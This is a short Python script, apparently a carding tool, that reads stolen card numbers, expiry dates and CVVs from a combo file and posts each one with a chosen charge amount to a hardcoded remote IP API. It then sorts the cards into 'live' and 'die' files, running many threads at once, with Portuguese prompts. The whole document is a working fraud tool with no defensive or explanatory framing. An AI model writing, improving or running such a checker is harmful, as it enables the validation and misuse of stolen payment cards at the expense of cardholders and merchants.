# Load necessary libraries
import utils, concurrent.futures
from multiprocessing import Lock

lock = Lock()

combofile = "./infos"
livefile = "./live"
valor = input("Valor: ")

def check():
    try:
        lock.acquire()
        info = utils.save.removeFirstLine(combofile).replace('|', ' ').strip()
        [cc, mes, ano, cvv] =  info.split(' ')
        session = utils.session(proxy=False)
        lock.release()
        response = session.post('http://132.226.41.121:1789/api', json={"card":cc,"month":mes,"year":ano,"cvv":cvv,"amount":valor,}, headers={"Authorization": "fofozap", "Content-Type": "application/json"})
        
        if "#SMT Invalid" in response.text or "Exception Error" in response.text:
            utils.colors.error(response.json()["Message"])
            utils.save.savetofile("die", response.json()["Message"])
        elif "#SMT Valid" in response.text:
            utils.colors.correct(response.json()["Message"])
            utils.save.savetofile(livefile, response.json()["Message"])
        else:
            utils.colors.info(f"#SMT Retest | CC: {info} | Erro: {response.json()['Message']}")
            utils.save.savetofile(combofile, info)
    except Exception as e:
        utils.colors.error(e)
        utils.save.savetofile(combofile, info)


if __name__ == "__main__":
    try:
        lista_len = utils.get_len(combofile)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

# End of Process, wait for user input
input("Pressione qualquer tecla para continuar. . .")
